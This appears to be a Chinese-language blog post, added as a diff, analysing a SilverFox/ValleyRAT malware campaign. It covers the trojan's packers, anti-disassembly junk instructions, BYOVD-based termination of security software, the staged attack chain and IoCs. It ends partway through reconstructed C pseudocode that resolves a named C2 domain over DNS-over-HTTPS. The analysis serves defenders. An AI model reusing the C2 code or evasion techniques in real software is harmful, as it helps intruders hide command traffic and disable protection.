@@ -1,0 +1,1190 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>银狐木马新一轮攻击全链拆解：从DoH隧道到管控终端滥用的攻击链还原 - Kane's Blog</title>
+<link rel="stylesheet" href="../theme/css/dark.css">
+</head>
+<body>
+<nav>
+  <a href="../" class="brand">Kane's Blog</a>
+  <span class="nav-links">
+    <a href="../" >Blog</a>
+    <a href="../calendar.html" >日历</a>
+    <a href="../projects2026/" >Projects</a>
+  </span>
+</nav>
+<main>
+<article>
+<h1>银狐木马新一轮攻击全链拆解：从DoH隧道到管控终端滥用的攻击链还原</h1>
+<time>2026-08-03</time>
+<ul>
+<li>技术
+Slug: 银狐木马新一轮攻击全链拆解-从doh隧道到管控终端滥用的攻击链还原</li>
+</ul>
+<hr />
+<h2>免责声明</h2>
+<p>本文所涉及的技术分析内容仅供安全研究、威胁情报分析和防御体系建设使用。文中提到的攻击技术细节、恶意代码片段、IoC指标等信息均基于公开可得的威胁情报样本进行逆向分析后整理而成。读者不得将本文所述技术用于任何非法用途，包括但不限于开发恶意软件、实施网络攻击、未经授权访问他人系统等。因不当使用本文信息所导致的任何法律责任和后果，由使用者自行承担。如遇疑似银狐木马感染，请立即联系专业安全团队进行处置。</p>
+<hr />
+<h2>一、引言</h2>
+<p>银狐木马（SilverFox），又称游蛇、谷堕大盗、ValleyRAT，是当前国内最活跃的远控木马家族之一。其技术根脉可追溯至2008年名噪一时的Gh0st RAT，核心架构改写自Winos 4.0框架。经过十余年的持续演化，银狐木马已从单一远控工具发展为"加载器层—核心控制层—功能插件层"的三层模块化架构，具备极强的免杀能力与功能扩展性。</p>
+<p>截至2026年4月，公开威胁情报平台累计收录超3万种银狐木马免杀样本，日均新增变种超10个。据多方安全机构统计，国内超70%的企业财务诈骗攻击与银狐木马家族直接相关，其攻击目标覆盖财务人员、行政管理人员及企业高管等高价值人群。</p>
+<p>本轮攻击中，银狐木马在多个维度实现了技术升级：C2通信层引入DNS-over-HTTPS（DoH）隐蔽隧道，使传统基于DNS解析和流量特征的检测手段大幅失效；样本层采用VMProtect虚拟化保护配合七类垃圾指令反汇编陷阱，显著增加了逆向分析成本；攻击链路中引入BYOVD（Bring Your Own Vulnerable Driver）技术实现内核态安全软件终止；更值得警惕的是，攻击者开始滥用企业统一终端管理系统和合法远控工具作为隐蔽后门通道。</p>
+<p>本文将从攻击链还原、样本深度分析、终端防护策略三个维度，对该轮攻击进行全面拆解，为威胁情报分析师和终端安全工程师提供可落地的检测与防御参考。</p>
+<hr />
+<h2>二、家族背景与架构演化</h2>
+<h3>2.1 技术根脉与演化路径</h3>
+<p>银狐木马的代码基因可清晰地追溯至Gh0st RAT体系。Gh0st RAT自2008年起被广泛使用，其核心的进程注入、屏幕监控、键盘记录等基础功能模块在银狐木马中均有保留和重写。银狐木马在Winos 4.0框架的基础上进行了大规模重构，引入了模块化插件架构，使核心控制层与功能插件层解耦，极大提升了变种生成效率与功能扩展灵活性。</p>
+<h3>2.2 三层架构解析</h3>
+<p>当前银狐木马采用"加载器层—核心控制层—功能插件层"的三层架构设计：</p>
+<table>
+<thead>
+<tr>
+<th>架构层级</th>
+<th>核心职责</th>
+<th>典型技术</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>加载器层</td>
+<td>初始投放、环境检测、载荷解密与释放</td>
+<td>INNO Setup篡改、Setup Factory嵌套、RustSL加载器、白加黑侧加载</td>
+</tr>
+<tr>
+<td>核心控制层</td>
+<td>C2通信、指令分发、持久化维护、反分析</td>
+<td>DoH隧道、VMProtect虚拟化、BYOVD驱动加载、RDTSC反时序</td>
+</tr>
+<tr>
+<td>功能插件层</td>
+<td>具体攻击功能执行</td>
+<td>键盘记录、凭据窃取、屏幕截图、进程注入、破坏性清理</td>
+</tr>
+</tbody>
+</table>
+<p>这种分层设计使得安全团队即使成功提取了某一层的样本，也难以完整还原整个攻击链路。加载器层频繁更换打包方式和混淆策略以规避检测，而核心控制层和功能插件层的代码相对稳定，构成了检测规则制定的关键锚点。</p>
+<h3>2.3 变种趋势</h3>
+<p>本轮攻击中观察到至少四种主要打包变种并行传播：</p>
+<ol>
+<li><strong>DoH变种</strong>：篡改INNO Setup投递，包装为雷电模拟器安装包（MD5: <code>8c4fc902905459a53f686372a1a85526</code>）</li>
+<li><strong>BYOVD变种</strong>：大体积PE配合overlay隐藏，父PE约72MB，.data段占58.4MB，overlay使用AES-ECB加密</li>
+<li><strong>AtlasCross变种</strong>：三层嵌套Setup Factory打包，使用被盗的EV代码签名证书签名，通信采用ChaCha20加密</li>
+<li><strong>RustSL加载器变种</strong>：修改版RustSL加载器，新增steganography.rs（隐写）和guard.rs（反分析守卫）模块</li>
+</ol>
+<hr />
+<h2>三、打包方式与投递手段分析</h2>
+<h3>3.1 篡改INNO Setup投递（DoH变种）</h3>
+<p>该变种将恶意载荷伪装为雷电模拟器（LDPlayer 9）安装程序。样本保留了INNO Setup的基本结构，但在<code>[Code]</code>段中嵌入恶意逻辑。安装过程中，样本释放白加黑组件（恶意DLL + 合法可执行文件），通过DLL搜索顺序劫持实现恶意DLL加载。该变种最终建立DoH隐蔽隧道进行C2通信。</p>
+<h3>3.2 大体积PE+overlay隐藏（BYOVD变种）</h3>
+<p>BYOVD变种采用了一种反直觉的体积膨胀策略。父PE文件约72MB，其中<code>.data</code>段占据了58.4MB。这种大体积设计有两个目的：一是拖慢沙箱分析速度，多数沙箱对大文件分析设有超时限制；二是为overlay区域提供掩护。overlay区域使用AES-ECB模式加密存储Stage-2和Stage-3载荷，在运行时按需解密释放。</p>
+<p>AES-ECB模式的选用值得关注。ECB模式由于相同明文块加密后产生相同密文块，在密码学上被认为是弱模式，但攻击者选择它的原因在于实现简单且无需初始化向量（IV），降低了载荷释放阶段的代码复杂度。</p>
+<h3>3.3 三层嵌套Setup Factory（AtlasCross变种）</h3>
+<p>AtlasCross变种采用三层嵌套的Setup Factory打包结构，最外层使用被盗的EV代码签名证书进行签名。EV代码签名证书的滥用使得该变种在SmartScreen和部分终端安全产品中获得了初始信任。通信层该变种采用ChaCha20加密，握手阶段发送特征Beacon字节序列：<code>53 46 75 63 6b 00 00 00</code>（ASCII: "SFuck\0\0\0"）。</p>
+<h3>3.4 修改版RustSL加载器</h3>
+<p>该变种基于开源的RustSL加载器进行修改，新增了两个关键模块：</p>
+<ul>
+<li><strong>steganography.rs</strong>：实现隐写术功能，将恶意载荷嵌入到看似无害的图片文件中（通常为PNG或BMP格式），通过LSB（最低有效位）或其他隐写算法提取载荷。</li>
+<li><strong>guard.rs</strong>：实现反分析守卫功能，包括虚拟机检测、调试器检测、沙箱环境检测等，在检测到分析环境时改变执行路径或退出运行。</li>
+</ul>
+<hr />
+<h2>四、混淆与反分析技术体系</h2>
+<h3>4.1 VMProtect虚拟化保护</h3>
+<p>银狐木马核心控制层约67%的函数被VMProtect虚拟化保护。VMProtect将原始x86/x64指令转换为自定义虚拟机字节码，运行时由嵌入的虚拟机解释器逐条解释执行。这使得静态反汇编几乎无法还原原始逻辑，动态调试也需要先理解虚拟机的指令集映射。</p>
+<h3>4.2 七类垃圾指令反汇编陷阱</h3>
+<p>在VMProtect保护范围之外的函数中，银狐木马系统性地插入七类垃圾指令来干扰反汇编引擎：</p>
+<table>
+<thead>
+<tr>
+<th>类别</th>
+<th>指令示例</th>
+<th>特征描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>BCD算术</td>
+<td><code>aad 0xFF</code> / <code>aam 0x0A</code> / <code>aaa</code> / <code>daa</code> / <code>das</code></td>
+<td>非十进制调整指令，不产生有效副作用</td>
+</tr>
+<tr>
+<td>死标志操作</td>
+<td><code>pushf</code> / <code>popf</code> / <code>lahf</code> / <code>clc</code> / <code>stc</code></td>
+<td>修改标志寄存器但结果未被使用</td>
+</tr>
+<tr>
+<td>死位操作</td>
+<td><code>btc</code> / <code>btr</code> / <code>bts</code> / <code>bt</code> / <code>bswap</code></td>
+<td>位测试/操作指令，对无关寄存器执行</td>
+</tr>
+<tr>
+<td>无意义比较</td>
+<td><code>cmp eax, eax</code> / <code>test ecx, ecx</code>（后无jcc）</td>
+<td>比较结果不影响控制流</td>
+</tr>
+<tr>
+<td>虚假栈操作</td>
+<td><code>push 0xDEAD; lea esp, [esp+4]</code></td>
+<td>入栈后立即调整栈指针，等价于NOP</td>
+</tr>
+<tr>
+<td>花指令</td>
+<td><code>jmp $+5; db 0xE8,0x00,0x00,0x00,0x00</code></td>
+<td>跳过垃圾字节，干扰线性扫描反汇编</td>
+</tr>
+<tr>
+<td>无意义移位</td>
+<td><code>shld</code> / <code>shrd</code> / <code>rol</code> / <code>ror</code></td>
+<td>对无关寄存器执行移位操作</td>
+</tr>
+</tbody>
+</table>
+<p><strong>自动化识别方法：</strong> 对每条指令进行污点分析，检查其操作结果是否被后续指令引用。若目标操作数在下一引用点之前被覆写，则标记为垃圾指令。在IDA Pro中可通过IDAPython脚本实现自动化标记和NOP填充。</p>
+<h3>4.3 XOR流密码就地解密</h3>
+<p>银狐木马广泛使用XOR流密码进行载荷就地解密。解密种子由文件前4字节与文件大小的异或值生成，随后以此为初始密钥对后续字节流进行XOR解密。这种设计使得每个样本的解密密钥都不同，但解密算法本身极其简单，便于在分析阶段还原。</p>
+<h3>4.4 Stage-2多层自解密</h3>
+<p>Stage-2载荷采用了多层自解密机制，最内层经历了321,039轮XOR/ADD流密码迭代。这种超高频次的迭代并非为了增加密码学强度（XOR/ADD组合的代数结构简单），而是为了拖慢动态分析工具的解密过程。分析人员需要在调试器中设置条件断点跳过大量迭代轮次，或直接编写脚本模拟解密过程。</p>
+<hr />
+<h2>五、完整攻击链还原</h2>
+<h3>5.1 五阶段攻击链总览</h3>
+<p>银狐木马本轮攻击可划分为五个连续阶段，从初始投递到最终远控上线，每个阶段都有明确的技术目标和对抗手段：</p>
+<div class="highlight"><pre><span></span><code>┌─────────────────────────────────────────────────────────────────────────┐
+│                    银狐木马新一轮攻击五阶段链路                            │
+├─────────────────────────────────────────────────────────────────────────┤
+│                                                                         │
+│  阶段1: 初始加载与环境突破                                                │
+│  ┌───────────────┐   ┌────────────────┐   ┌──────────────┐            │
+│  │ 父PE加载      │──▶│ RDTSC反时序门   │──▶│ Stage-2      │            │
+│  │ (INNO/PE/Rust)│   │ 延迟检测沙箱    │   │ 内存自解密   │            │
+│  └───────────────┘   └────────────────┘   └──────┬───────┘            │
+│                                                   │ UAC自提升          │
+│                                                   ▼                    │
+│  阶段2: 载荷释放与持久化部署                                              │
+│  ┌───────────────┐   ┌────────────────┐   ┌──────────────┐            │
+│  │ Stage-3提取   │──▶│ BYOVD驱动加载  │──▶│ 多重持久化   │            │
+│  │ (AES-ECB解密) │   │ TrueSight.sys  │   │ 部署         │            │
+│  └───────────────┘   └────────────────┘   └──────┬───────┘            │
+│                                                   │                    │
+│  阶段3: 安全软件对抗                              ▼                    │
+│  ┌───────────────┐   ┌────────────────┐   ┌──────────────┐            │
+│  │ VDI解码       │──▶│ 212个安全软件   │──▶│ 内核态进程   │            │
+│  │ (虚拟设备接口)│   │ 进程枚举       │   │ 终止         │            │
+│  └───────────────┘   └────────────────┘   └──────┬───────┘            │
+│                                                   │                    │
+│  阶段4: 二阶段载荷投递                            ▼                    │
+│  ┌───────────────┐   ┌────────────────┐   ┌──────────────┐            │
+│  │ OSS远程下载   │──▶│ 白加黑侧加载   │──▶│ 内存执行     │            │
+│  │ (HTTPS)       │   │ (DLL劫持)      │   │ (Process     │            │
+│  └───────────────┘   └────────────────┘   │  Hollowing)  │            │
+│                                            └──────┬───────┘            │
+│                                                   │                    │
+│  阶段5: 远控上线与持久控制                         ▼                    │
+│  ┌───────────────┐   ┌────────────────┐   ┌──────────────┐            │
+│  │ RAT上线       │──▶│ C2三通道通信   │──▶│ 远程控制     │            │
+│  │ (Beacon握手)  │   │ DoH+TCP+HTTPS  │   │ (56条指令集) │            │
+│  └───────────────┘   └────────────────┘   └──────────────┘            │
+│                                                                         │
+│  横向滥用层:                                                             │
+│  ┌─────────────────────────────────────────────────────────────┐       │
+│  │  企业管控终端滥用  │  AnyDesk后门化  │  tscon RDP会话劫持  │       │
+│  └─────────────────────────────────────────────────────────────┘       │
+│                                                                         │
+└─────────────────────────────────────────────────────────────────────────┘
+</code></pre></div>
+
+<h3>5.2 阶段1：初始加载与环境突破</h3>
+<p>父PE文件加载后，首先执行RDTSC（Read Time-Stamp Counter）反时序延迟门。该技术通过读取CPU时间戳计数器，测量代码执行间隔时间来判断是否运行在沙箱或调试器环境中。沙箱通常执行速度异常快或存在时间加速，而人工调试时断点会导致时间间隔异常大。通过设置合理的时间阈值窗口，木马可在非真实环境中改变执行路径或退出运行。</p>
+<p>通过时间检测后，Stage-2载荷在内存中自解密。该过程不落盘，直接在分配的内存区域中执行321,039轮XOR/ADD流密码迭代解密。随后利用UAC（用户账户控制）自提升技术获取更高权限，为后续BYOVD驱动加载做准备。</p>
+<h3>5.3 阶段2：载荷释放与持久化部署</h3>
+<p>Stage-3载荷从AES-ECB加密的overlay区域提取并解密。随后加载BYOVD驱动——本轮攻击中使用的是TrueSight驱动（<code>TrueSight.sys</code>），该驱动因存在已知漏洞可被用于终止任意进程而被攻击者选中。驱动加载成功后，木马部署多重持久化机制（详见第七节）。</p>
+<h3>5.4 阶段3：安全软件对抗</h3>
+<p>该阶段是本轮攻击中最具破坏性的环节。木马通过VDI（Virtual Device Interface）解码获取内置的安全软件进程名列表，共包含212个安全软件进程名，覆盖国内外主流杀毒软件、EDR终端、安全工具等。随后通过已加载的TrueSight驱动在内核态逐一终止这些进程。由于终止操作发生在内核态，安全软件的自身保护机制（如回调注册、句柄保护等）无法有效拦截。</p>
+<h3>5.5 阶段4：二阶段载荷投递</h3>
+<p>安全软件被清除后，木马通过HTTPS从OSS（对象存储服务）下载二阶段载荷。该载荷采用"白加黑"方式投递：下载一个具有合法签名的可执行文件（白）和一个恶意DLL（黑），利用DLL搜索顺序劫持使白文件加载黑DLL。恶意DLL在内存中执行Process Hollowing（进程镂空）技术，将最终RAT载荷注入到合法系统进程中运行。</p>
+<h3>5.6 阶段5：远控上线与持久控制</h3>
+<p>RAT载荷在系统进程中运行后，向C2服务器发送上线Beacon。AtlasCross变种的握手Beacon为<code>53 46 75 63 6b 00 00 00</code>。上线成功后建立三通道C2通信架构（详见第六节），并开放56条远控指令集，涵盖下载执行、TCP中继、键盘记录、屏幕截图、破坏性清理等功能。</p>
+<hr />
+<h2>六、DoH隧道通信深度还原</h2>
+<h3>6.1 三通道C2架构</h3>
+<p>银狐木马本轮攻击的核心创新在于C2通信层的三通道冗余架构设计。三个通道互为备份，当某一通道被阻断时自动切换至备用通道，极大提升了C2通信的韧性：</p>
+<table>
+<thead>
+<tr>
+<th>通道</th>
+<th>通信协议</th>
+<th>特征</th>
+<th>用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>主通道</td>
+<td>DoH HTTPS</td>
+<td>流量伪装为正常DNS查询，经DoH服务器中转</td>
+<td>C2域名解析与指令下发</td>
+</tr>
+<tr>
+<td>备用通道1</td>
+<td>TCP自定义协议</td>
+<td>消息类型(3)+标志(7)+数据载荷(15)，非标准端口</td>
+<td>大数据量传输与文件回传</td>
+</tr>
+<tr>
+<td>备用通道2</td>
+<td>WinHTTP/WinINET HTTPS</td>
+<td>标准HTTPS流量，伪装为正常Web访问</td>
+<td>备用指令通道</td>
+</tr>
+</tbody>
+</table>
+<h3>6.2 DoH隧道通信原理</h3>
+<p>DNS-over-HTTPS（DoH）将DNS查询封装在HTTPS请求中发送至DoH服务器（本轮攻击使用AliDNS <code>223.5.5.5</code>和Google DNS <code>8.8.8.8</code>）。由于DoH流量在外观上与正常的HTTPS Web访问无异，传统基于DNS明文查询特征的检测规则完全失效。攻击者将C2域名<code>oidng2.duoshit.com</code>通过DoH解析获取实际C2 IP，随后建立加密通信通道。</p>
+<h3>6.3 DoH隧道通信C伪代码还原</h3>
+<p>以下为基于逆向分析还原的DoH隧道通信核心逻辑伪代码：</p>
+<div class="highlight"><pre><span></span><code><span class="cm">/* ============================================================</span>
+<span class="cm"> * 银狐木马 DoH 隧道通信核心逻辑还原（C伪代码）</span>
+<span class="cm"> * 基于逆向分析重建，非原始源码</span>
+<span class="cm"> * ============================================================ */</span>
+
+<span class="cp">#define DOH_SERVER_ALIDNS   &quot;https:</span><span class="c1">//223.5.5.5/dns-query&quot;</span>
+<span class="cp">#define DOH_SERVER_GOOGLE   &quot;https:</span><span class="c1">//8.8.8.8/dns-query&quot;</span>
+<span class="cp">#define DOH_CONTENT_TYPE    &quot;application/dns-message&quot;</span>
+<span class="cp">#define C2_DOMAIN           &quot;oidng2.duoshit.com&quot;</span>
+<span class="cp">#define C2_PORT             7000</span>
+
+<span class="cm">/* DoH DNS查询构造（DNS wire format） */</span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">build_dns_query</span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">buflen</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">domain</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+
+<span class="w">    </span><span class="cm">/* DNS Header (12 bytes) */</span>
+<span class="w">    </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xAB</span><span class="p">;</span><span class="w">          </span><span class="cm">/* Transaction ID (高字节) */</span>
+<span class="w">    </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0xCD</span><span class="p">;</span><span class="w">          </span><span class="cm">/* Transaction ID (低字节) */</span>
+<span class="w">    </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x01</span><span class="p">;</span><span class="w">          </span><span class="cm">/* Flags: 标准查询, RD=1 */</span>
+<span class="w">    </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">;</span>
+<span class="w">    </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">;</span><span class="w">          </span><span class="cm">/* QDCOUNT (高) */</span>
+<span class="w">    </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x01</span><span class="p">;</span><span class="w">          </span><span class="cm">/* QDCOUNT (低): 1个问题 */</span>
+<span class="w">    </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">;</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">;</span><span class="w">  </span><span class="cm">/* ANCOUNT */</span>
+<span class="w">    </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">;</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">;</span><span class="w">  </span><span class="cm">/* NSCOUNT */</span>
+<span class="w">    </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">;</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">;</span><span class="w">  </span><span class="cm">/* ARCOUNT */</span>
+
+<span class="w">    </span><span class="cm">/* QNAME: 将域名编码为label格式 */</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">domain</span><span class="p">;</span>
+<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">ptr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">dot</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">strchr</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;.&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">label_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dot</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)(</span><span class="n">dot</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">ptr</span><span class="p">)</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+<span class="w">        </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="p">)</span><span class="n">label_len</span><span class="p">;</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="n">ptr</span><span class="p">,</span><span class="w"> </span><span class="n">label_len</span><span class="p">);</span>
+<span class="w">        </span><span class="n">offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">label_len</span><span class="p">;</span>
+<span class="w">        </span><span class="n">ptr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dot</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">dot</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">label_len</span><span class="p">;</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">dot</span><span class="p">)</span><span class="w"> </span><span class="k">break</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">;</span><span class="w">          </span><span class="cm">/* QNAME 终止符 */</span>
+
+<span class="w">    </span><span class="cm">/* QTYPE: A记录 (0x0001) */</span>
+<span class="w">    </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">;</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x01</span><span class="p">;</span>
+<span class="w">    </span><span class="cm">/* QCLASS: IN (0x0001) */</span>
+<span class="w">    </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x00</span><span class="p">;</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x01</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">offset</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cm">/* 通过DoH解析C2域名获取IP */</span>
+<span class="kt">int</span><span class="w"> </span><span class="nf">resolve_c2_via_doh</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">doh_server</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">domain</span><span class="p">,</span>
+<span class="w">                       </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">resolved_ip</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">ip_len</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">dns_query</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">query_len</span><span class="p">;</span>
+<span class="w">    </span><span class="n">HINTERNET</span><span class="w"> </span><span class="n">hSession</span><span class="p">,</span><span class="w"> </span><span class="n">hConnect</span><span class="p">,</span><span class="w"> </span><span class="n">hRequest</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">response</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">bytes_read</span><span class="p">;</span>
+
+<span class="w">    </span><span class="cm">/* 构造DNS wire format查询 */</span>
+<span class="w">    </span><span class="n">query_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">build_dns_query</span><span class="p">(</span><span class="n">dns_query</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">dns_query</span><span class="p">),</span><span class="w"> </span><span class="n">domain</span><span class="p">);</span>
+
+<span class="w">    </span><span class="cm">/* 使用WinHTTP发起DoH POST请求 */</span>
+<span class="w">    </span><span class="n">hSession</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WinHttpOpen</span><span class="p">(</span><span class="sa">L</span><span class="s">&quot;SilverFox/3.0&quot;</span><span class="p">,</span>
+<span class="w">                           </span><span class="n">WINHTTP_ACCESS_TYPE_DEFAULT_PROXY</span><span class="p">,</span>
+<span class="w">                           </span><span class="n">WINHTTP_NO_PROXY_NAME</span><span class="p">,</span><span class="w"> </span><span class="n">WINHTTP_NO_PROXY_BYPASS</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">hSession</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+
+<span class="w">    </span><span class="cm">/* 直接连接DoH服务器的IP地址，绕过DNS解析 */</span>
+<span class="w">    </span><span class="n">hConnect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WinHttpConnect</span><span class="p">(</span><span class="n">hSession</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">&quot;223.5.5.5&quot;</span><span class="p">,</span>
+<span class="w">                              </span><span class="n">INTERNET_DEFAULT_HTTPS_PORT</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">hConnect</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hSession</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">hRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WinHttpOpenRequest</span><span class="p">(</span><span class="n">hConnect</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">&quot;POST&quot;</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">&quot;/dns-query&quot;</span><span class="p">,</span>
+<span class="w">                                  </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">WINHTTP_NO_REFERER</span><span class="p">,</span>
+<span class="w">                                  </span><span class="n">WINHTTP_DEFAULT_ACCEPT_TYPES</span><span class="p">,</span>
+<span class="w">                                  </span><span class="n">WINHTTP_FLAG_SECURE</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">hRequest</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">WinHttpCloseHandle</span><span class="p">(</span><span class="n">hConnect</span><span class="p">);</span>
